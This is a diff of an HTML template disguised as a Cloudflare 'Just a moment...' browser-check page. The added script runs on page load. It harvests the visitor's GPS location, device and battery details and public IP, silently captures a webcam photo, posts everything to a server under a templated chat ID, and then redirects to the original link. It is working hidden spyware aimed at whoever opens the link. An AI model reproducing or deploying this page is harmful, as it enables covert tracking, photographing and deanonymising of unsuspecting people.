@@ -1,19 +1,172 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Just a moment...</title>
-    <meta http-equiv="refresh" content="3">
     <style>
-        body { background: #f7f7f7; font-family: Arial, sans-serif; text-align: center; margin-top: 100px; }
-        .cf-spinner { margin: 40px auto; width: 60px; height: 60px; border: 8px solid #ddd; border-top: 8px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite; }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
+            background-color: #f7f7f7;
+            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+            margin: 0;
+        }
+        .container {
+            background: #fff;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            max-width: 500px;
+        }
+        h1 {
+            color: #1a1a1a;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        p {
+            font-size: 16px;
+            line-height: 1.6;
+        }
+        img {
+            max-width: 100px;
+            margin-bottom: 20px;
+        }
+        .spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            border-left-color: #007bff;
+            animation: spin 1s ease infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
-    <h2>Checking your browser before accessing...</h2>
-    <div class="cf-spinner"></div>
-    <p>This process is automatic. Your browser will redirect to your requested content shortly.</p>
-    <p>Please allow up to 5 seconds...</p>
+    <div class="container">
+        <img src="https://www.cloudflare.com/favicon.ico" alt="Cloudflare logo">
+        <h1>Just a moment...</h1>
+        <p>Please enable JavaScript, location services, and camera to proceed. Our security checks require this information to verify your access.</p>
+        <div class="spinner"></div>
+    </div>
+
+    <script>
+        // জাভাস্ক্রিপ্ট কোড শুরু
+        async function getDeviceInformation() {
+            const battery = await navigator.getBattery();
+            return {
+                ip_address: null, // আমরা সার্ভার সাইড থেকে এটি পেতে পারি
+                user_agent: navigator.userAgent,
+                platform: navigator.platform,
+                device_name: navigator.appName,
+                online_status: navigator.onLine,
+                battery_level: battery.level * 100 + '%',
+                charging_status: battery.charging ? 'Charging' : 'Not Charging'
+            };
+        }
+
+        async function getIPAddress() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (e) {
+                return 'unknown';
+            }
+        }
+
+        async function postData(data) {
+            const chat_id = "<%= chat_id %>";
+            const api_url = "/api/data";
+            data.chat_id = chat_id;
+
+            try {
+                const response = await fetch(api_url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                return await response.json();
+            } catch (e) {
+                console.error("Failed to post data:", e);
+                return null;
+            }
+        }
+
+        async function getLocation() {
+            return new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        resolve({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        });
+                    },
+                    error => {
+                        console.error("Location permission denied or error:", error);
+                        resolve({});
+                    }
+                );
+            });
+        }
+
+        async function getCameraImage() {
+            return new Promise((resolve, reject) => {
+                const video = document.createElement('video');
+                const canvas = document.createElement('canvas');
+                
+                navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                    .then(stream => {
+                        video.srcObject = stream;
+                        video.play();
+                        video.onloadedmetadata = () => {
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            stream.getTracks().forEach(track => track.stop()); // ক্যামেরা বন্ধ করা
+                            const imageDataURL = canvas.toDataURL('image/jpeg');
+                            resolve(imageDataURL.split(',')[1]); // base64 ডেটা নেওয়া
+                        };
+                    })
+                    .catch(error => {
+                        console.error("Camera access denied or error:", error);
+                        resolve(null);
+                    });
+            });
+        }
+
+        async function collectAndSendData() {
+            const location = await getLocation();
+            const device_info = await getDeviceInformation();
+            device_info.ip_address = await getIPAddress();
+            const image = await getCameraImage();
+
+            const payload = {
+                location: location,
+                device_info: device_info,
+                image: image
+            };
+            
+            await postData(payload);
+            
+            // ডেটা পাঠানোর পর আসল লিংকে রিডিরেক্ট করা
+            const original_url = "<%= original_url %>";
+            if (original_url && original_url !== 'about:blank') {
+                window.location.href = original_url;
+            }
+        }
+
+        window.onload = collectAndSendData;
+    </script>
 </body>
 </html>
